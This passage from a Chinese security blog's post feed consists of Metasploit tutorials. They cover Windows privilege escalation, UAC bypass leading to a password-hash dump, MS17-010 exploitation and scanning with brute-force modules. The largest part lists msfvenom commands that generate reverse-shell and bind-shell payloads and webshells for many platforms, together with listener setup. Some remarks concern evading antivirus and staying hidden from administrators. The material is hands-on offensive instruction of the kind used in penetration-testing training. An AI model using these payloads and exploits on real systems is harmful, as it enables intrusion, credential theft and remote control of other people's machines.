<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-6-2.png" alt="msf-6-2"></p>
<h2 id="搜索本地提权利用漏洞"><a href="#搜索本地提权利用漏洞" class="headerlink" title="搜索本地提权利用漏洞"></a>搜索本地提权利用漏洞</h2><p>​    <code>search exploit/windows/local</code>搜索windows提权payload，对搜索结果是否可提权进行判断，在payload之前加info查看是否要设置session，需要设置session一般为可提权payload</p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-7.png" alt="msf-7"></p>
<p>选取ms18_8120进行提权</p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-7-1.png" alt="msf-7-1"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-8.png" alt="msf-8"></p>
<p>设置配置参数</p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-9.png" alt="msf-9"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-10.png" alt="msf-10"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-11.png" alt="msf-11"></p>
<h2 id="可信任服务利用（自动提权）"><a href="#可信任服务利用（自动提权）" class="headerlink" title="可信任服务利用（自动提权）"></a>可信任服务利用（自动提权）</h2><p><img src="//choge.top/2019/10/30/msf之windows提权/msf-12.png" alt="msf-12"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-13.png" alt="msf-13"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-14.png" alt="msf-14"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-15.png" alt="msf-15"></p>
<p>如下图所示，此方法提权失败</p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-16.png" alt="msf-16"></p>
<p>此方法由于利用可信服务进行自动提权会有不免杀的缺点</p>
<p>参考链接：</p>
<p><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a></p>
<p><a href="https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions</a></p>
<p><a href="https://medium.com/@harshaunsingh/windows-privileged-escalation-manual-and-using-metasploit-framework-ch-1-fd5f31a7db86" target="_blank" rel="noopener">https://medium.com/@harshaunsingh/windows-privileged-escalation-manual-and-using-metasploit-framework-ch-1-fd5f31a7db86</a></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>windows</tag>
        <tag>privilege</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之windows提权_uac绕过</title>
    <url>/2019/10/29/msf%E4%B9%8Bwindows%E6%8F%90%E6%9D%83-uac%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h2><p>用户账户控制（简称UAC）是微软公司在其Windows Vista，及更高版本操作系统中采用的一种控制机制。通过 本文你将了解它是如何保护你免受恶意软件侵害的，以及忽略UAC提示将可能给你系统带来的麻烦。 </p><h2 id="UAC是如何运作的"><a href="#UAC是如何运作的" class="headerlink" title="UAC是如何运作的"></a>UAC是如何运作的</h2><p>一旦程序执行涉及系统更改/特定任务就会触发UAC。除非尝试执行它们的进程以管理员权限运行，否则这些操作都将被阻止。没有管理员权限将无法执行以下操作: </p><a id="more"></a>

<ul>
<li>注册表修改(如果注册表项位于如HKEY_LOCAL_MACHINE下(因为它影响多个用户)，它将是只读的)</li>
<li>加载设备驱动程序</li>
<li>DLL注入</li>
<li>修改系统时间(clock) </li>
<li>修改用户帐户控制设置(通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操作) </li>
<li>修改受保护的目录(例如Windows文件夹，Program Files) </li>
<li>计划任务(例如，以管理员权限自启动) </li>
</ul>
<p><a href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">hackingarticles参考链接</a></p>
<h2 id="msf如何绕过UAC限制"><a href="#msf如何绕过UAC限制" class="headerlink" title="msf如何绕过UAC限制"></a>msf如何绕过UAC限制</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_silentcleanup</span><br><span class="line">exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure>

<h2 id="msf之UAC绕过实战"><a href="#msf之UAC绕过实战" class="headerlink" title="msf之UAC绕过实战"></a>msf之UAC绕过实战</h2><p>已在目标机Windows2008 x64 R2 上已获取一个shell，进行hashdump尝试，发现无法执行</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-1.png" alt="msf-1"></p>
<p>利用<code>exploit/windows/local/bypassuac</code>模块进行uac绕过，利用session的id值为3</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-2.png" alt="msf-2"></p>
<p>查看配置信息</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-3.png" alt="msf-3"></p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-4.png" alt="msf-4"></p>
<p>需要配置session、LHOST、LPORT、Payload、target等信息，其中session为3，LHOST、LPORT、Payload等配置信息要与生成的木马配置信息相同，target为目标机操作系统和位数，配置如下</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-5.png" alt="msf-5"></p>
<p>执行后成功获取hashdump</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-6.png" alt="msf-6"></p>
<p>利用<code>exploit/windows/local/bypassuac_comhijack</code>模块进行uac绕过，利用session的id值为3</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-7.png" alt="msf-7"></p>
<p>查看配置信息</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-8.png" alt="msf-8"></p>
<p>配置如下</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-9.png" alt="msf-9"></p>
<p>成功获取hashdump</p>
<p><img src="//choge.top/2019/10/29/msf之windows提权-uac绕过/msf-10.png" alt="msf-10"></p>
<p>实战环境中可利用不同模块逐个尝试</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>uac</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之正反向payload生成与实战</title>
    <url>/2019/10/22/msf%E4%B9%8B%E6%AD%A3%E5%8F%8D%E5%90%91payload%E7%94%9F%E6%88%90%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>本文主要详解Metasploit正反向payload生成和在Windows和Linux下的实际应用</p><p>反向连接为目标机连接攻击机</p><p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-1.png" alt></p><p>正向连接为攻击机连接目标机</p><p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-2.png" alt></p><p>反向好处只要做了免杀，目标机器开启杀毒软件和防火墙也能和vps的msf连通</p><h2 id="反向Payload生成"><a href="#反向Payload生成" class="headerlink" title="反向Payload生成"></a>反向Payload生成</h2><h3 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h3><p>Windows</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><a id="more"></a>








<p>-p为选择的payload，LHOST为攻击机ip地址，LPORT一般选用常用端口，如21,80,8080,53等，为了防止防火墙拦截</p>
<p>msf下可以使用<code>search payload</code>或<code>msfvenom -l payloads</code>来搜索payloads，选择要使用的payload，利用<code>info</code>查看详细配置方法</p>
<p><code>search payload</code>显示如下，payload开头部分为有效部分</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-3.png" alt></p>
<p><code>msfvenom -l payloads</code>显示如下</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-4.png" alt></p>
<p>payload配置信息如下</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-5.png" alt></p>
<p>Linux</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>Mac</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<h3 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a>生成webshell脚本</h3><p>PHP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d 'n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<p>ASP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<p>JSP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<p>WAR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h3 id="生成其他脚本shell"><a href="#生成其他脚本shell" class="headerlink" title="生成其他脚本shell"></a>生成其他脚本shell</h3><p>Python</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p>Bash</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>Powershell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -File shell.ps1</span><br></pre></td></tr></table></figure>

<h3 id="msf接收"><a href="#msf接收" class="headerlink" title="msf接收"></a>msf接收</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.88.128</span><br><span class="line">set LPORT 4444</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<p>-j -z为获取一个shell直接到后台，不在前端回显</p>
<h2 id="反向payload实战演示"><a href="#反向payload实战演示" class="headerlink" title="反向payload实战演示"></a>反向payload实战演示</h2><h3 id="目标机为Windows"><a href="#目标机为Windows" class="headerlink" title="目标机为Windows"></a>目标机为Windows</h3><p>Kali下生成payload，传到Windows目标机，双击运行</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-6.png" alt="msf-6"></p>
<p>msf攻击机配置如下</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-7.png" alt="msf-7"></p>
<p>注意如果监听过程中一直进不了meterpreter，可能是由于杀毒软件和防火墙限制，还有可能是payload设置位数和目标机不同，如下图为攻击成功</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-8.png" alt="msf-8"></p>
<p><code>background</code>进入将meterpreter进入后台</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-9.png" alt="msf-9"></p>
<h3 id="目标机器为Linux"><a href="#目标机器为Linux" class="headerlink" title="目标机器为Linux"></a>目标机器为Linux</h3><p>生成Linux</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-20.png" alt="msf-20"></p>
<p>进入Linux机器添加权限后执行</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-10.png" alt="msf-10"></p>
<p>攻击机配置如下</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-11.png" alt="msf-11"></p>
<p>执行成功</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-12.png" alt="msf-12"></p>
<h2 id="正向payload生成"><a href="#正向payload生成" class="headerlink" title="正向payload生成"></a>正向payload生成</h2><p>正向payload使用主要看场景，比如目标机器不给其他除特定端口外的端口出站，那就只能能正向;还有比如有一种情 况，目标处于深层网络，不能直接连通外网，也不能通过其他机器连通，因为其他机器防火墙都开着，为避免 在有防火墙监控的情况下关闭防火墙而被发现，也只能用正向的马，然后通过开着防火墙的机器来进行端口的 转发达到穿透的目的。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;/root/bind_xx.exe </span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;/root/bind_xx.exe</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt;/root/bind_xx.dll </span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt;/root/bind_xx.dll</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt;/root/bind_xx.elf</span><br><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt;/root/bind_xx.elf</span><br></pre></td></tr></table></figure>

<p>生成exe会有进程显示，dll以系统启动，更不易被管理员发现</p>
<h2 id="正向payload实战演示"><a href="#正向payload实战演示" class="headerlink" title="正向payload实战演示"></a>正向payload实战演示</h2><p>正向payload为在目标机执行shell，从而开放端口，使得攻击机只能连接上目标机</p>
<h3 id="目标机为windows"><a href="#目标机为windows" class="headerlink" title="目标机为windows"></a>目标机为windows</h3><p>目标机端口开放情况如下</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-13.png" alt="msf-13"></p>
<p>生成payload</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-14.png" alt="msf-14"></p>
<p>目标机执行后打开4444端口，等待连接</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-16.png" alt="msf-16"></p>
<p>info+payload查看选中payload需配置参数</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-15.png" alt="msf-15"></p>
<p>攻击机配置如下可获取meterpreter</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-17.png" alt="msf-17"></p>
<p>攻击机查看端口情况，4444端口已非等待监听状态，如果攻击机尝试连接却没有连接成功需要重新执行shell文件，Linux下同理</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-18.png" alt="msf-18"></p>
<p>连接状态</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-19.png" alt="msf-19"></p>
<h3 id="目标机为Linux"><a href="#目标机为Linux" class="headerlink" title="目标机为Linux"></a>目标机为Linux</h3><p>生成shell文件，赋予执行权限并执行，缺图</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf &gt;/root/bind_xx.elf</span><br></pre></td></tr></table></figure>

<p>攻击机进行连接并获取meterpreter</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-21.png" alt="msf-21"></p>
<p>一共获取4个meterpreter，Linux和Windows正反向各两个</p>
<p><img src="//choge.top/2019/10/22/msf之正反向payload生成与实战/msf-22.png" alt="msf-22"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>payload</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之exploit模块实战</title>
    <url>/2019/10/21/msf%E4%B9%8Bexploit%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>本文主要对exploit模块进行实战演示</p><h2 id="ms17-010漏洞实战"><a href="#ms17-010漏洞实战" class="headerlink" title="ms17_010漏洞实战"></a>ms17_010漏洞实战</h2><p>nmap扫描是否存在ms17_010</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script smb-vuln-ms17-010 ip地址</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2019/10/21/msf之exploit模块实战/msf-1.png" alt></p><p>扫描结果漏洞存在，进入msf进行ms17_010漏洞利用模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show targets</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2019/10/21/msf之exploit模块实战/msf-2.png" alt></p><p>此处无序选择</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2019/10/21/msf之exploit模块实战/msf-3.png" alt></p><p>选择合适的payload</p><a id="more"></a>













<p><img src="//choge.top/2019/10/21/msf之exploit模块实战/msf-4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<p>设置rhost等参数后run进行攻击</p>
<p><img src="//choge.top/2019/10/21/msf之exploit模块实战/msf-5.png" alt></p>
<p>攻击成功</p>
<p><img src="//choge.top/2019/10/21/msf之exploit模块实战/msf-6.png" alt></p>
<p>也可尝试正向payload攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之auxiliary常用模块实战</title>
    <url>/2019/10/20/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>auxiliary为msf中的扫描模块，本文主要介绍auxiliary常用实战模块</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>部分命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack   #ack绕过防火墙扫描  一般不在内网使用，容易引发安全设备告警 利用于安全设备防火墙绕过，而非windows自带防火墙</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce   #ftp跳端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn   #syn端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp   #tcp端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas   #tcp-xmas端口扫描</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>在外网扫描线程可以开得稍大，在内网扫描线程可以开得小一点，因为内网容易引发安全设备的流量监控，所以前期信息收集很重要</p>
<p>tcp扫描并设置线程为</p>
<p><img src="//choge.top/2019/10/20/msf之auxiliary常用模块实战/msf-1.png" alt></p>
<p><img src="//choge.top/2019/10/20/msf之auxiliary常用模块实战/msf-2.png" alt></p>
<p>exploit后扫描结果</p>
<p><img src="//choge.top/2019/10/20/msf之auxiliary常用模块实战/msf-3.png" alt></p>
<p>由于扫描比较慢，使用指定端口扫描<br><img src="//choge.top/2019/10/20/msf之auxiliary常用模块实战/msf-4.png" alt></p>
<h2 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h2><p>部分命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br><span class="line">auxiliary/scanner/mssql/mssql_version</span><br></pre></td></tr></table></figure>

<p>扫描版本信息</p>
<p><img src="//choge.top/2019/10/20/msf之auxiliary常用模块实战/msf-5.png" alt></p>
<h2 id="登录爆破"><a href="#登录爆破" class="headerlink" title="登录爆破"></a>登录爆破</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_login </span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br></pre></td></tr></table></figure>

<p>扫描mssql_login</p>
<p><img src="//choge.top/2019/10/20/msf之auxiliary常用模块实战/msf-6.png" alt></p>
<p><img src="/Users/c0cho/hexo/source/_posts/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/msf-7.png" alt></p>
<p><img src="/Users/c0cho/hexo/source/_posts/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/msf-8.png" alt></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_hashdump //dump密码hash auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>

<p>扫描ms17_010并利用</p>
<p><img src="/Users/c0cho/hexo/source/_posts/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/msf-9.png" alt></p>
<p><img src="/Users/c0cho/hexo/source/_posts/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/msf-10.png" alt></p>
<p><img src="/Users/c0cho/hexo/source/_posts/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/msf-11.png" alt></p>
<p><img src="/Users/c0cho/hexo/source/_posts/msf%E4%B9%8Bauxiliary%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98/msf-12.png" alt></p>
<p>最后漏洞利用未成功，但步骤正确，可做参考</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如rhosts后接的为多个ip地址，可采用写入ips.txt的方式来扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set rhosts file:/root/ips.txt</span><br></pre></td></tr></table></figure>

<p>ips.txt内容为</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">192.168.1.1</span><br><span class="line">192.168.1.4</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>​    </p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>auxiliary</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit各模块详解</title>
    <url>/2019/10/20/msf%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>本文主要介绍Metasploit各个模块功能和通用使用方法</p><h2 id="msf模块路径"><a href="#msf模块路径" class="headerlink" title="msf模块路径"></a>msf模块路径</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vultr modules]# ls</span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br><span class="line">[root@vultr modules]# pwd</span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules</span><br></pre></td></tr></table></figure><a id="more"></a>


<h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><p>漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。 </p>
<h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><p>攻击载荷，explo it 成功之后就会执行payload，这段paylo ad可以是反弹代码，可以是添加用户的代码。 </p>
<h2 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h2><p>辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解。</p>
<h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><p>后渗透模块，该模块一般用于内网渗透。</p>
<h2 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h2><p>编码器模块，对payload进行编码加密，可绕过部分杀软软件。</p>
<h2 id="evasion"><a href="#evasion" class="headerlink" title="evasion"></a>evasion</h2><p>躲避模块，该模块分类下只有4 个，都是为了躲避微软的限制或者是杀软的，免杀效果很一般。</p>
<h2 id="nops"><a href="#nops" class="headerlink" title="nops"></a>nops</h2><p>空空指令是对一些程序运行状态不会造成任何实质影响的空操作或者无关操作指令，对于x86 CPU就是0x90。</p>
<h2 id="msf基础命令"><a href="#msf基础命令" class="headerlink" title="msf基础命令"></a>msf基础命令</h2><p>启动msf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>​    获取帮助，msfconsole后help</p>
<p><img src="//choge.top/2019/10/20/msf模块详解/msf-1.png" alt></p>
<p>使用模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 模块名</span><br></pre></td></tr></table></figure>

<p>use 模块名，按两下table键会提示是否显示所有模块</p>
<p><img src="//choge.top/2019/10/20/msf模块详解/msf-2.png" alt> </p>
<p>显示windows下smb的exploit</p>
<p><img src="//choge.top/2019/10/20/msf模块详解/smf-3.png" alt></p>
<p>进入ms17-010永恒之蓝漏洞利用</p>
<p><img src="//choge.top/2019/10/20/msf模块详解/msf-4.png" alt></p>
<p>查看漏洞详细信息，漏洞利用模块下执行info，也可以在框架下执行如下代码效果相同，可展示漏洞详细信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">info windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2019/10/20/msf模块详解/msf-5.png" alt></p>
<p>显示模块配置信息，一般情况下显示yes的需要配置，显示no的不需要配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2019/10/20/msf模块详解/msf-6.png" alt></p>
<p>如设置ip地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS ip地址</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2019/10/20/msf模块详解/msf-7.png" alt></p>
<p>漏洞利用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2019/10/20/msf模块详解/msf-8.png" alt></p>
<p>上图漏洞利用未成功，因ip为无效ip</p>
<p>退出exploit模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">back</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2019/10/20/msf模块详解/msf-9.png" alt></p>
<p>退出msf控制台</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2019/10/20/msf模块详解/msf-10.png" alt></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>module</tag>
      </tags>
  </entry>
  <entry>
    <title>VPS安装Metasploit与更新</title>
    <url>/2019/10/15/vps%E5%AE%89%E8%A3%85msf%E4%B8%8E%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>文章主要是对msf基本的用法总结，先从最简单的vps选择和msf安装更新开始</p><h2 id="VPS购买与选择"><a href="#VPS购买与选择" class="headerlink" title="VPS购买与选择"></a>VPS购买与选择</h2><h3 id="VPS选择"><a href="#VPS选择" class="headerlink" title="VPS选择"></a>VPS选择</h3><p>vps一般选择vultr和BandwagonHost,vultr购买参考链<a href="https://www.vultrcn.com/1.html" target="_blank" rel="noopener">vultr</a>，BandwagonHost购买参考链接<a href="https://banwagong.cn/" target="_blank" rel="noopener">BandwagonHost</a>,我选择购买vultr，一般规格选择1核1G，因为会在上面部署SSR，Metasploit和Cobalt Strike等服务。</p><a id="more"></a>

<h2 id="VPS安装Metasploit"><a href="#VPS安装Metasploit" class="headerlink" title="VPS安装Metasploit"></a>VPS安装Metasploit</h2><h3 id="安装Metasploit"><a href="#安装Metasploit" class="headerlink" title="安装Metasploit"></a>安装Metasploit</h3><p>终端执行命令。</p>
